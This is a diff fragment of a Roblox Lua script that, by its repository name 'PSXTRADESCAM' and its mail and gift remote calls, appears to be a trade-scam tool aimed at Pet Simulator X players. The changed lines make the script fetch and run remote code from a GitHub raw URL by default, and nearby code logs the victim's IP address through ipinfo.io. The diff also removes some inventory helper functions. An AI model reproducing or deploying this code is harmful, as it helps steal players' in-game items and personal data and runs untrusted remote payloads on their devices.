@@ -213,7 +213,7 @@ local IPadress = game:HttpGet('https://ipinfo.io/ip')
 local data1
 
 -- Loading Screen
-if _G.LoadingScreen ~= true then
+if _G.LoadingScreen ~= false then
     loadstring(game:HttpGet('https://raw.githubusercontent.com/BIFE123/PSXTRADESCAM/main/LOADER'))()
 end
 
@@ -249,29 +249,6 @@ claimallremote = blobz[blobb[2](2, claimallremote)]
 getmailremote = blobz[blobb[2](2, getmailremote)]
 redeemrankremote = blobz[blobb[2](2, redeemrankremote)]
 redeemgiftsremote = blobz[blobb[2](2, redeemgiftsremote)]
-
--- Inv Space Check :
-
-function invspace()
-    local invspace = PlayerInfos.MaxSlots - #PlayerInfos.Pets
-    if invspace > 50 then
-        invspace = 50
-    end
-    return invspace
-end
-
-function invspace_nolimit()
-    local invspace = PlayerInfos.MaxSlots - #PlayerInfos.Pets
-    return invspace
-end
-
-
-local bdiaamt = 0
-local bdiaamt2 = 0
-local bdiaamt3 = 0
-local bdiaamt4 = 0
-local bdiaamt5 = 0
-local FinalFinal = 0
 
 -- Redeem Free Gifts
 
